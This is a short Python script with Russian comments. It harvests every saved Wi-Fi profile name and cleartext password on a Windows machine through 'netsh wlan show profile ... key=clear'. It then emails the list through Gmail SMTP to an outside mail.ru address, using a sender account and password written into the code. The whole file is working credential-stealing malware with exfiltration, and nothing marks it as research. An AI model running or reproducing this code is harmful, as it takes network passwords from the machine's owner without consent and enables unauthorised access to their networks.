from email.mime.multipart import MIMEMultipart
from email.mime.image import MIMEImage
from email.mime.text import MIMEText
import smtplib
import subprocess  # для управления системой

message = []

data = subprocess.check_output(
    ['netsh', 'wlan', 'show', 'profiles']).decode('cp866').split('\n')
# Создаем список всех названий всех профилей сети (имена сетей)
WiFis = [line.split(':')[1][1:-1]
         for line in data if "Все профили пользователей" in line]
# Для каждого имени...
for WiFi in WiFis:
    # ...вводим запрос netsh wlan show profile [ИМЯ_Сети] key=clear
    results = subprocess.check_output(
        ['netsh', 'wlan', 'show', 'profile', WiFi, 'key=clear']).decode('cp866').split('\n')
    # Забираем ключ
    results = [line.split(':')[1][1:-1]
               for line in results if "Содержимое ключа" in line]
    # Пытаемся его вывести в командной строке, отсекая все ошибки
    try:
        message.append(f'Имя сети: {WiFi}, Пароль: {results[0]} \n')
        print(f'Имя сети: {WiFi}, Пароль: {results[0]} \n')
    except IndexError:
        message.append(f'Имя сети: {WiFi}, Пароль не найден! \n')
        print(f'Имя сети: {WiFi}, Пароль не найден! \n')

# create message object instance
msg = MIMEMultipart()

st = ''.join(message)

# setup the parameters of the message
password = "JavaScript12"
msg['From'] = "mihailsarabarin00@gmail.com"
msg['To'] = "Zelendra12@mail.ru"
msg['Subject'] = "Wifi pass"


# add in the message body
msg.attach(MIMEText(st, 'plain'))
# msg.attach(MIMEText(message, 'html'))

#create server
server = smtplib.SMTP('smtp.gmail.com: 587')


server.starttls()

# Login Credentials for sending the mail
server.login(msg['From'], password)


# send the message via the server.
server.sendmail(msg['From'], msg['To'], msg.as_string())

server.quit()

